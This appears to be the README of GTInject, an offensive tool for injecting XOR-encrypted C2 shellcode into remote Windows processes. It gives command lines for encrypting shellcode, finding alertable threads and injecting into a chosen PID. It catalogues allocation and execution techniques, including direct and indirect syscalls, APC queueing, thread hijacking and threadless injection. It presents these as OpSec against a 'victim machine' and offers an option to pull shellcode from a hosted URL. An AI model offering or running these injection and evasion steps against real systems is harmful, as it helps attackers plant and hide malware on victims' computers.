# GTInject
**Portable and Modular Remote Process Injection**

Remote process injection in C2 frameworks are often limited to one or two techniques built by the beacon developer. This tool is designed to offer mix and match memory allocation and thread execution techniques for process injection, with the goal of being portable accross C2 systems. 

It is largely inspired by the flexibility given within Brute Ratel, which made other C2 injection options feel extremely limited. I wanted to recreate that functionality for other C2s that I like using. 



## GTInject.exe Help Menu

## Usage: GTInject.exe \<module> \<moduleArgs>
       GTInject.exe threads
       GTInject.exe encrypt pathToSource.bin MySecretXorKey
       GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID

       GTInject.exe inject 100 100 SecretKey123 disk "C:\path\to\xordShellcode.file" 1234 321

## Encrypt  -- for encrypting shellcode:
**Do this in preparation, NOT on the C2 victim machine.**

       GTInject.exe encrypt pathToSource.bin MySecretXorKey

Shellcode from your C2 will be multibyte XOR'd and written in various formats.

This is intended to help you use the injection option later with better OpSec.

## Threads  -- check for alertable threads:

       GTInject.exe threads


This will list alertable threads in all processes that you have access to. This is intended to help identify alertable threads, for injection options like QueueUserAPC.

By default, it filters out low and untrusted process integrities. 

Options include `GTinject.exe threads <all or alertable> <optional PID filter>` 

So you could show all threads in a process with `GTInject.exe threads all 4321`


## Inject   -- choose a process injection method

       GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID

       GTInject.exe inject 100 100 SecretKey123 disk "C:\path\to\xordShellcode.file" 1234 321

Choose a technique integer for allocating the memory.

Then choose a technique integer for executing the thread.

Enter the XorKey to decrypt it with, the same one you used to encrypt the shellcode using the **encrypt** module.

Specify a location type where the encrypted shellcode is stored. Acceptable values are
- embedded 0
- url https://example.globetech.biz/hostedShellcode.b64
- disk 'C:\path\to\xord-shellcode.bin'

Specify the PID you want to inject into.

OPTIONALLY specify the TID (not all options need a Thread ID).

## Call Categories
- 100 Series - WINAPI
- 200 Series - NTAPI 
- 300 Series - Syscalls
- 400 Series - Misc or Novel Techniques

## Memory Options
        100. WINAPI  -- VirtualAllocEx, WriteProcessMemory
        200. NTAPI   -- NtCreateSection, NtMapViewOfSection, RtlCopyMemory
        201. NTAPI   -- NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
        300. SysCall -- Direct, NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory 
        301. SysCall -- Direct, NtCreateSection, NtMapViewOfSection, RtlCopyMemory
        302. SysCall -- Indirect, NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
        303. SysCall -- Indirect, NtCreateSection, NtMapViewOfSection, RtlCopyMemory

## ThreadExec Options
        100. WINAPI  -- CreateRemoteThread
        101. WINAPI  -- QueueUserAPC, ResumeThread - Must Specify Thread ID
        102. WINAPI  -- GetThreadContext, SetThreadContext - Thread ID Optional
        200. NTAPI   -- NtCreateThreadEx
        201. NTAPI   -- RtlCreateUserThread
        202. NTAPI   -- NtQueueApcThread, NtResumeThread - Must Specify Thread ID
        203. NTAPI   -- NtGetContextThread, NtSetContextThread - Thread ID Optional
        300. SysCall -- Direct, NtCreateThreadEx
        301. SysCall -- Direct, NtQueueApcThread, NtResumeThread - Must Specify Thread ID
        302. SysCall -- Indirect, NtCreateThreadEx
        303. SysCall -- Indirect, NtQueueApcThread, NtResumeThread - Must Specify Thread ID
        304. Syscall -- Direct, NtGetContextThread, NtSetContextThread - Thread ID Optional
        305. Syscall -- Indirect, NtGetContextThread, NtSetContextThread - Thread ID Optional
        400. Novel   -- ThreadlessInject, CreateEventW - does not honor memory option
        401. Novel   -- ThreadlessInject, LoadLibraryExW - does not honor memory option